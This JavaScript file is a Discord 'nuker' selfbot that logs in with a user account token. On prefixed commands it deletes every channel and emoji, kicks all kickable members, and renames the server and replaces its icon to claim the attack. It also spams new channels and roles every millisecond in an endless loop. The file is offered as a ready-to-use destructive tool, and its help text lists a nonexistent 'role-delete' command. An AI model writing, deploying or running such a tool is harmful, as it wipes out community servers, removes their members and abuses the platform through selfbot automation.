const { Client } = require('discord.js-self');
const client = new Client();
const prefix = "+";
const token = "YOUR_TOKEN";
const { blue, red, bgCyan, bgGreen } = require("chalk");

client.on("ready", () => {
    console.log(`Client: ${client.user.tag} | ${client.user.id}\nPrefix: ${prefix}\nMade With ♥ By Ahad#3257\nCheck: https://www.itscruel.cf/`);
    client.user.setActivity("YouTube", {
        type: "WATCHING"
    });
});

client.on("message", async (msg) => {
    if (!msg.content.startsWith(prefix) || msg.author.bot || !msg.guild ) return;
    if (msg.content.includes("nuke")) {
        await msg.guild.channels.cache.forEach((c) => c.delete(`CHANNEL DELETED BY ${msg.author.username}`, console.log(blue(`[Channel Deleted] - ${c.name}`))));
        msg.guild.emojis.cache.forEach((e) => e.delete(`EMOJI DELETED BY ${msg.author.username}`, console.log(red(`[Emoji Deleted] - ${e.name} emote deleted`))));
        await msg.guild.channels.create(`${msg.author.username}`);
            msg.guild.setIcon(msg.author.avatarURL({dynamic: true}));
            console.log(bgCyan(`Setted Server's Icon to ${msg.author.avatarURL()}`));
            msg.guild.setName(`ПUKΣD BY ${msg.author.username}`);
            console.log(bgGreen(`Setted Server's Name to ПUKΣD BY ${msg.author.username}`));
            msg.guild.members.cache.filter((m) => m.kickable).forEach(async (m) => {
              m.kick(`KICKED BY ${msg.author.username}`),
              console.log(red(`[Kicked] - ${m.user.tag} | ${m.user.id}`))
          });
}

    if(msg.content.includes("channel-spam")) {
      setInterval(() => {
        msg.guild.channels.create(`${msg.author.username}`).then((c) => {
        console.log(red(`[Channel Spam] - ${c.name}`));
        }).catch((e) => {

      });
  }, 1);
}

    if(msg.content.includes("channel-delete")) {
      msg.guild.channels.cache.forEach((c) => c.delete(`CHANNEL DELETED BY ${msg.author.username}`, console.log(blue(`[Channel Deleted] - ${c.name}`))));
}

    if(msg.content.includes("role-spam")) {
      setInterval(() => {
        msg.guild.roles.create({
            name: `${msg.author.username}`
        }).then((r) => {
            console.log(red(`[Role Spam] - ${r.name}`));
            }).catch((e) => {

        });
  }, 1)
}

    if(msg.content.includes("kick-all")) {
      msg.guild.members.cache.filter((m) => m.kickable).forEach(async (m) => {
        m.kick(`KICKED BY ${msg.author.username}`),
        console.log(red(`[Kicked] - ${m.user.tag} | ${m.user.id}`))
  });
}

if(msg.content.includes("help")) {
  msg.channel.send(`Client: ${client.user.tag} | ${client.user.id}\nPrefix: ${prefix}\nMade With ♥ By Ahad#3257\nCheck: https://www.itscruel.cf/` + "\n\n```yml\n" + `Command: ${prefix}nuke\nFunction: Deletes roles, channels, and kick members.\n\nCommand: ${prefix}channel-delete\nFunction: Deletes channels.\n\nCommand: ${prefix}channel-spam\nFunction: Spams channels.\n\nCommand: ${prefix}role-delete\nFunction: Spams roles.\n\nCommand: ${prefix}kick-all\nFunction: Kicks all members.\n` + "```")
}
});

client.login(token);